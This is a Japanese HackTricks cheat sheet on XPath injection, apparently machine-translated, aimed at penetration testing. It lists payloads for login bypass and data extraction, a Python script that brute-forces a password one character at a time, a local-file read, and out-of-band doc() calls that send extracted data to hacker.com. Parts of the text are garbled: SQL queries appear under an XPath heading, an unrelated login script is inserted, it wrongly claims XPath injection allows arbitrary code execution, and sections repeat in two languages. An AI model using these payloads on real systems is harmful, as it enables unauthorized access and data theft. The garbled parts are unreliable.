# XPATHインジェクション

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProofはすべての暗号バグバウンティのホームです。**

**遅延なしで報酬を受け取る**\
HackenProofのバウンティは、顧客が報酬予算を入金した後にのみ開始されます。バグが検証された後に報酬を受け取ることができます。

**Web3ペントestingの経験を積む**\
ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！その成長期におけるweb3セキュリティをマスターしましょう。

**Web3ハッカーレジェンドになる**\
各検証済みのバグごとに評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。

[**HackenProofでサインアップ**](https://hackenproof.com/register)して、ハッキングから収益を得ましょう！

{% embed url="https://hackenproof.com/register" %}

## **基本構文**

XPathインジェクションは、ユーザーが提供した入力からXPath（XMLパス言語）クエリを構築してXMLドキュメントをクエリまたはナビゲートするアプリケーションを悪用するための攻撃技術です。

クエリの作成方法に関する情報：[https://www.w3schools.com/xml/xpath\_syntax.asp](https://www.w3schools.com/xml/xpath\_syntax.asp)

### ノード

| 式         | 説明                                                                                                 |
| ---------- | ---------------------------------------------------------------------------------------------------- |
| nodename   | 名前が「nodename」のすべてのノードを選択します。                                                     |
| /          | ルートノードから選択します。                                                                         |
| //         | 現在のノードからドキュメント内の選択に一致するノードを選択します。どこにあっても選択します。         |
| .          | 現在のノードを選択します。                                                                           |
| ..         | 現在のノードの親を選択します。                                                                       |
| @          | 属性を選択します。                                                                                   |

### **例:**

| パスの式         | 結果                                                                                                                                 |
| --------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| bookstore       | 名前が「bookstore」のすべてのノードを選択します。                                                                                     |
| /bookstore      | bookstore要素を選択します**注：**パスがスラッシュ（/）で始まる場合、常に要素への絶対パスを表します。                                |
| bookstore/book  | bookstoreの子であるすべてのbook要素を選択します。                                                                                      |
| //book          | ドキュメント内のどこにあっても、すべてのbook要素を選択します。                                                                         |
| bookstore//book | bookstore要素の子孫であるすべてのbook要素を選択します。どこにあっても、bookstore要素の下にあるかどうかは関係ありません。                 |
| //@lang         | 名前がlangであるすべての属性を選択します。                                                                                             |

### 述語

| パスの式                     | 結果                                                                                                                                                                                                                                                                                                         |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| /bookstore/book\[1]         | <p>bookstore要素の子である最初のbook要素を選択します。<strong>注:</strong> IE 5,6,7,8,9では最初のノードは[0]ですが、W3Cによると[1]です。この問題をIEで解決するには、SelectionLanguageをXPathに設定します。</p><p>JavaScriptでの設定方法：xml.setProperty("SelectionLanguage","XPath");</p> |
| /bookstore/book\[last()]    | bookstore要素の子である最後のbook要素を選択します。                                                                                                                                                                                                                                       |
| /bookstore/book\[last()-1]  | bookstore要素の子である最後から2番目のbook要素を選択します。                                                                                                                                                                                                                                 |
| /bookstore/book\[position()<3] | bookstore要素の子である最初の2つのbook要素を選択します。                                                                                                                                                                                                                                 |
| //title\[@lang]             | langという名前の属性を持つすべてのtitle要素を選択します。                                                                                                                                                                                                                                               |
| //title\[@lang='en']        | 値が「en」の「lang」属性を持つすべてのtitle要素を選択します。                                                                                                                                                                                                                                           |
| /bookstore/book\[price>35.00] | bookstore要素のbook要素で、価格要素の値が35.00より大きいすべてのbook要素を選択します。                                                                                                                                                                                                                   |
| /bookstore/book\[price>35.00]/title | bookstore要素のbook要素で、価格要素の値が35.00より大きいすべてのtitle要素を選択します。                                                                                                                                                                                                                   |

### 不明なノード

| ワイルドカード | 説明                   |
| ------------ | --------------------- |
| \*           | 任意の要素ノードに一致 |
| @\*          | 任意の属性ノードに一致 |
| node()       | 任意の種類のノードに一致 |
### **例:**

| パス式 | 結果 |
| --------------- | ------------------------------------------------------------------------ |
| /bookstore/\*   | bookstore要素のすべての子要素ノードを選択します |
| //\*            | ドキュメント内のすべての要素を選択します |
| //title\[@\*]   | 任意の種類の属性を持つすべてのtitle要素を選択します |

<figure><img src="../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProofはすべての暗号バグ報酬の場所です。**

**遅延なしで報酬を受け取る**\
HackenProofの報酬は、顧客が報酬予算を入金した後にのみ開始されます。バグが検証された後に報酬を受け取ることができます。

**Web3ペントestingの経験を積む**\
ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！その成長する日々において、web3セキュリティをマスターしましょう。

**Web3ハッカーレジェンドになる**\
各検証済みのバグごとに評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。

[**HackenProofでサインアップ**](https://hackenproof.com/register) ハックから収益を得ましょう！

{% embed url="https://hackenproof.com/register" %}

## 例
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<data>
<user>
<name>pepe</name>
<password>peponcio</password>
<account>admin</account>
</user>
<user>
<name>mark</name>
<password>m12345</password>
<account>regular</account>
</user>
<user>
<name>fino</name>
<password>fino2</password>
<account>regular</account>
</user>
</data>
```
### 情報へのアクセス

XPath Injection is a technique used to exploit vulnerabilities in web applications that use XPath to query XML data. By injecting malicious XPath expressions into user input fields, an attacker can manipulate the XPath query and gain unauthorized access to sensitive information.

XPath is a language used to navigate XML documents and extract data. It uses path expressions to select nodes or sets of nodes in an XML document. In web applications, XPath is commonly used to query XML data stored in databases or retrieved from external sources.

To perform an XPath Injection attack, an attacker needs to identify a vulnerable input field that is used in an XPath query. This can be a search box, a login form, or any other user input field that is used to construct an XPath query.

Once a vulnerable input field is identified, the attacker can start injecting malicious XPath expressions. These expressions are designed to manipulate the XPath query and extract sensitive information from the XML data.

For example, consider a web application that uses XPath to query a database of user information. The application allows users to search for other users by their username. The XPath query used by the application might look like this:

```
//users/user[username='input']
```

In this example, the `input` parameter is the user-supplied value that is used in the XPath query. An attacker can exploit this vulnerability by injecting a malicious XPath expression that always evaluates to true, such as:

```
' or 1=1 or 'a'='a
```

By injecting this expression into the username field, the attacker can manipulate the XPath query to return all user records instead of just the one matching the supplied username. This allows the attacker to access sensitive information about all users in the database.

XPath Injection attacks can be prevented by properly validating and sanitizing user input before using it in an XPath query. Input validation should include checking for special characters and escaping them if necessary. Additionally, using parameterized queries or prepared statements can help protect against XPath Injection attacks by separating user input from the query logic.

By understanding and exploiting XPath Injection vulnerabilities, a penetration tester can help organizations identify and fix security flaws in their web applications, ensuring the protection of sensitive information.
```
All names - [pepe, mark, fino]
name
//name
//name/node()
//name/child::node()
user/name
user//name
/user/name
//user/name

All values - [pepe, peponcio, admin, mark, ...]
//user/node()
//user/child::node()


Positions
//user[position()=1]/name #pepe
//user[last()-1]/name #mark
//user[position()=1]/child::node()[position()=2] #peponcio (password)

Functions
count(//user/node()) #3*3 = 9 (count all values)
string-length(//user[position()=1]/child::node()[position()=1]) #Length of "pepe" = 4
substrig(//user[position()=2/child::node()[position()=1],2,1) #Substring of mark: pos=2,length=1 --> "a"
```
### スキーマの特定と盗み出し

XPathインジェクションは、Webアプリケーションの脆弱性を悪用して、データベースのスキーマを特定し、その情報を盗み出す攻撃手法です。

攻撃者は、Webアプリケーションの入力フィールドに対して改変されたXPathクエリを注入します。この注入されたクエリは、アプリケーションがデータベースに対して実行するXPathクエリとして解釈されます。

攻撃者は、注入されたXPathクエリを利用して、データベースのスキーマ情報を特定します。XPathクエリの結果を分析することで、テーブル名、カラム名、データ型などの重要な情報を取得することができます。

スキーマ情報を盗み出した後、攻撃者はこれを悪用して、データベースからさらなる機密情報を抽出することができます。また、スキーマ情報を利用して、データベース内のデータを改ざんしたり、他の攻撃手法を展開することも可能です。

XPathインジェクション攻撃を防ぐためには、適切な入力検証とエスケープ処理が必要です。また、セキュリティ意識の高い開発手法を採用し、脆弱性診断やペネトレーションテストを定期的に実施することが重要です。
```python
and count(/*) = 1 #root
and count(/*[1]/*) = 2 #count(root) = 2 (a,c)
and count(/*[1]/*[1]/*) = 1 #count(a) = 1 (b)
and count(/*[1]/*[1]/*[1]/*) = 0 #count(b) = 0
and count(/*[1]/*[2]/*) = 3 #count(c) = 3 (d,e,f)
and count(/*[1]/*[2]/*[1]/*) = 0 #count(d) = 0
and count(/*[1]/*[2]/*[2]/*) = 0 #count(e) = 0
and count(/*[1]/*[2]/*[3]/*) = 1 #count(f) = 1 (g)
and count(/*[1]/*[2]/*[3]/[1]*) = 0 #count(g) = 0

#The previous solutions are the representation of a schema like the following
#(at this stage we don't know the name of the tags, but jus the schema)
<root>
<a>
<b></b>
</a>
<c>
<d></d>
<e></e>
<f>
<h></h>
</f>
</c>
</root>

and name(/*[1]) = "root" #Confirm the name of the first tag is "root"
and substring(name(/*[1]/*[1]),1,1) = "a" #First char of name of tag `<a>` is "a"
and string-to-codepoints(substring(name(/*[1]/*[1]/*),1,1)) = 105 #Firts char of tag `<b>`is codepoint 105 ("i") (https://codepoints.net/)

#Stealing the schema via OOB
doc(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
doc-available(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
```
## 認証バイパス

### **クエリの例：**
```
string(//user[name/text()='+VAR_USER+' and password/text()='+VAR_PASSWD+']/account/text())
$q = '/usuarios/usuario[cuenta="' . $_POST['user'] . '" and passwd="' . $_POST['passwd'] . '"]';
```
### **ユーザー名とパスワードのORバイパス（両方に同じ値を使用）**

In some cases, when a web application uses XPath queries to authenticate users, it is possible to bypass the login mechanism by injecting a specific payload. This technique is known as XPath Injection.

いくつかの場合、WebアプリケーションがXPathクエリを使用してユーザーを認証する場合、特定のペイロードを注入することでログインメカニズムをバイパスすることができます。この技術はXPathインジェクションとして知られています。

XPath is a language used to navigate XML documents and is commonly used in web applications to extract data from XML-based responses. However, if the application does not properly sanitize user input, an attacker can manipulate the XPath query to execute arbitrary code.

XPathは、XMLドキュメントをナビゲートするための言語であり、XMLベースのレスポンスからデータを抽出するためにWebアプリケーションで一般的に使用されます。しかし、アプリケーションがユーザーの入力を適切にサニタイズしない場合、攻撃者はXPathクエリを操作して任意のコードを実行することができます。

One common scenario where XPath Injection can be exploited is when the application uses the same value for both the username and password fields during authentication. By injecting a payload that results in a true condition, the attacker can bypass the login mechanism and gain unauthorized access to the application.

XPathインジェクションが悪用される一般的なシナリオの1つは、アプリケーションが認証中にユーザー名とパスワードの両方に同じ値を使用する場合です。真の条件を結果とするペイロードを注入することにより、攻撃者はログインメカニズムをバイパスし、アプリケーションへの不正アクセスを得ることができます。

To perform an OR bypass in the username and password fields, the attacker can inject the following payload:

ユーザー名とパスワードのフィールドでORバイパスを実行するために、攻撃者は次のペイロードを注入することができます。

```
' or '1'='1
```

This payload manipulates the XPath query to always evaluate to true, bypassing the authentication check. The injected payload effectively changes the query to `'username' = 'username' or '1'='1' and 'password' = 'password'`, which will always be true.

このペイロードは、XPathクエリを常にtrueに評価するように操作し、認証チェックをバイパスします。注入されたペイロードは、クエリを`'username' = 'username' or '1'='1' and 'password' = 'password'`に効果的に変更し、常にtrueになります。

By injecting this payload, the attacker can log in to the application without providing valid credentials, effectively bypassing the authentication mechanism.

このペイロードを注入することで、攻撃者は有効な資格情報を提供せずにアプリケーションにログインすることができ、認証メカニズムをバイパスすることができます。
```
' or '1'='1
" or "1"="1
' or ''='
" or ""="
string(//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text())

Select account
Select the account using the username and use one of the previous values in the password field
```
### **nullインジェクションの悪用**

Null injection is a technique used to exploit vulnerabilities in applications that use XPath queries to retrieve data from XML documents. XPath is a language used to navigate through elements and attributes in an XML document.

Null injection occurs when an attacker is able to inject a null value into an XPath query, causing the query to return unintended results or bypass certain security checks.

To understand how null injection works, let's consider an example. Suppose we have a web application that uses an XPath query to retrieve user information from an XML document:

```xml
<users>
  <user>
    <name>John Doe</name>
    <email>john@example.com</email>
  </user>
  <user>
    <name>Jane Smith</name>
    <email>jane@example.com</email>
  </user>
</users>
```

The application may have a functionality that allows users to search for other users by name. The XPath query used to retrieve the user information might look like this:

```xpath
/users/user[name='John Doe']
```

In this example, the query retrieves the user information for the user with the name "John Doe". However, if the application does not properly validate user input and allows an attacker to inject a null value, the query could be manipulated to return unintended results.

For instance, an attacker could inject a null value into the query like this:

```xpath
/users/user[name='' or '1'='1']
```

In this case, the query will return all user information because the condition `'1'='1'` is always true. The attacker can then gather sensitive information about all users, not just the intended target.

To prevent null injection attacks, it is important to properly validate and sanitize user input before using it in XPath queries. Input validation should include checking for null values and ensuring that only expected characters are allowed.

By understanding and exploiting null injection vulnerabilities, attackers can gain unauthorized access to sensitive information and potentially compromise the security of an application. It is crucial for developers and security professionals to be aware of this technique and take appropriate measures to mitigate the risk.
```
Username: ' or 1]%00
```
### **ユーザー名またはパスワードのいずれかに二重のOR**（脆弱なフィールドが1つだけの場合に有効）

重要：**「and」は最初に実行される操作**であることに注意してください。
```
Bypass with first match
(This requests are also valid without spaces)
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
string(//user[name/text()='' or true() or '' and password/text()='']/account/text())

Select account
'or string-length(name(.))<10 or' #Select account with length(name)<10
'or contains(name,'adm') or' #Select first account having "adm" in the name
'or contains(.,'adm') or' #Select first account having "adm" in the current value
'or position()=2 or' #Select 2º account
string(//user[name/text()=''or position()=2 or'' and password/text()='']/account/text())

Select account (name known)
admin' or '
admin' or '1'='2
string(//user[name/text()='admin' or '1'='2' and password/text()='']/account/text())
```
## 文字列の抽出

出力には文字列が含まれており、ユーザーは値を操作して検索することができます。
```
/user/username[contains(., '+VALUE+')]
```

```
') or 1=1 or (' #Get all names
') or 1=1] | //user/password[('')=(' #Get all names and passwords
') or 2=1] | //user/node()[('')=(' #Get all values
')] | //./node()[('')=(' #Get all values
')] | //node()[('')=(' #Get all values
') or 1=1] | //user/password[('')=(' #Get all names and passwords
')] | //password%00 #All names and passwords (abusing null injection)
')]/../*[3][text()!=(' #All the passwords
')] | //user/*[1] | a[(' #The ID of all users
')] | //user/*[2] | a[(' #The name of all users
')] | //user/*[3] | a[(' #The password of all users
')] | //user/*[4] | a[(' #The account of all users
```
## 盲目的な攻撃

### **値の長さを取得し、比較によって抽出する:**
```bash
' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''=' #True if length equals 4
' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''=' #True is first equals "a"

substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)

... and ( if ( $employee/role = 2 ) then error() else 0 )... #When error() is executed it rises an error and never returns a value
```
### **Pythonの例**

```python
import requests

def login(username, password):
    url = "https://example.com/login"
    payload = {
        "username": username,
        "password": password
    }
    response = requests.post(url, data=payload)
    return response.text

def get_user_data(username):
    url = f"https://example.com/user/{username}"
    response = requests.get(url)
    return response.text

def main():
    username = input("Enter your username: ")
    password = input("Enter your password: ")

    login_response = login(username, password)
    if "Login successful" in login_response:
        user_data = get_user_data(username)
        print(user_data)
    else:
        print("Login failed")

if __name__ == "__main__":
    main()
```

このPythonの例では、`requests`モジュールを使用してWebアプリケーションに対してログインし、ユーザーデータを取得する方法が示されています。

`login`関数では、指定されたユーザー名とパスワードを使用してログインリクエストを送信し、レスポンスを返します。

`get_user_data`関数では、指定されたユーザー名を使用してユーザーデータを取得するためのリクエストを送信し、レスポンスを返します。

`main`関数では、ユーザーにユーザー名とパスワードを入力させ、ログインが成功した場合はユーザーデータを表示します。ログインが失敗した場合は、「Login failed」と表示されます。

この例は、Pythonを使用してWebアプリケーションに対してログインし、ユーザーデータを取得する基本的な方法を示しています。
```python
import requests, string

flag = ""
l = 0
alphabet = string.ascii_letters + string.digits + "{}_()"
for i in range(30):
r = requests.get("http://example.com?action=user&userid=2 and string-length(password)=" + str(i))
if ("TRUE_COND" in r.text):
l = i
break
print("[+] Password length: " + str(l))
for i in range(1, l + 1): #print("[i] Looking for char number " + str(i))
for al in alphabet:
r = requests.get("http://example.com?action=user&userid=2 and substring(password,"+str(i)+",1)="+al)
if ("TRUE_COND" in r.text):
flag += al
print("[+] Flag: " + flag)
break
```
### ファイルの読み取り

XPathインジェクションは、Webアプリケーションの脆弱性の一つであり、攻撃者がアプリケーションのバックエンドデータベースから情報を抽出することができます。この攻撃は、アプリケーションがユーザーの入力を適切に検証せずにXPathクエリに直接組み込む場合に発生します。

攻撃者は、悪意のあるXPathクエリを注入することで、データベースから機密情報を取得することができます。例えば、以下のようなXPathクエリを考えてみましょう。

```plaintext
SELECT * FROM users WHERE username = 'admin' AND password = 'password'
```

攻撃者は、ユーザー名の入力フィールドに`' OR '1'='1'--`という値を入力することで、以下のようなXPathクエリを生成します。

```plaintext
SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = 'password'
```

このクエリは常に真を返すため、攻撃者はデータベース内のすべてのユーザー情報を取得することができます。

XPathインジェクションの攻撃を防ぐためには、入力値の適切な検証とエスケープが必要です。アプリケーションは、ユーザーの入力を信頼せず、適切なフィルタリングとサニタイズを行う必要があります。また、プレースホルダを使用してクエリを構築することも推奨されます。
```python
(substring((doc('file://protected/secret.xml')/*[1]/*[1]/text()[1]),3,1))) < 127
```
## OOB Exploitation

Out-of-Band (OOB) exploitation is a technique used in XPath injection attacks to extract data from a vulnerable web application. XPath injection occurs when an attacker is able to manipulate an XPath query used by the application to retrieve data from an XML document.

In OOB exploitation, the attacker injects malicious XPath queries that trigger requests to an external server controlled by the attacker. This allows the attacker to extract sensitive information from the application and send it to their own server.

To perform OOB exploitation, the attacker needs to identify a vulnerable parameter in the application that is used in an XPath query. They then inject a payload that includes an XPath function that triggers an HTTP request to their server. The attacker can use various techniques to extract data, such as blind XPath injection or error-based techniques.

Blind XPath injection involves injecting queries that result in a true or false condition, allowing the attacker to infer information based on the application's response. Error-based techniques involve injecting queries that intentionally cause errors in the application, revealing information in the error messages.

Once the attacker successfully extracts data using OOB exploitation, they can use it for various purposes, such as further attacks or data exfiltration. It is important for developers to implement proper input validation and sanitization techniques to prevent XPath injection vulnerabilities and protect sensitive data.
```python
doc(concat("http://hacker.com/oob/", RESULTS))
doc(concat("http://hacker.com/oob/", /Employees/Employee[1]/username))
doc(concat("http://hacker.com/oob/", encode-for-uri(/Employees/Employee[1]/username)))

#Instead of doc() you can use the function doc-available
doc-available(concat("http://hacker.com/oob/", RESULTS))
#the doc available will respond true or false depending if the doc exists,
#user not(doc-available(...)) to invert the result if you need to
```
### 自動ツール

{% embed url="https://xcat.readthedocs.io/" %}

## 参考文献

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20injection" %}

<figure><img src="../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProofはすべての暗号バグ報酬の場です。**

**遅延なしで報酬を受け取る**\
HackenProofの報酬は、顧客が報酬予算を入金した後に開始されます。バグが検証された後に報酬を受け取ることができます。

**Web3ペンテストの経験を積む**\
ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！成長するWeb3セキュリティをマスターしましょう。

**Web3ハッカーレジェンドになる**\
各検証済みのバグごとに評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。

[**HackenProofでサインアップ**](https://hackenproof.com/register)してハッキングから報酬を得ましょう！

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
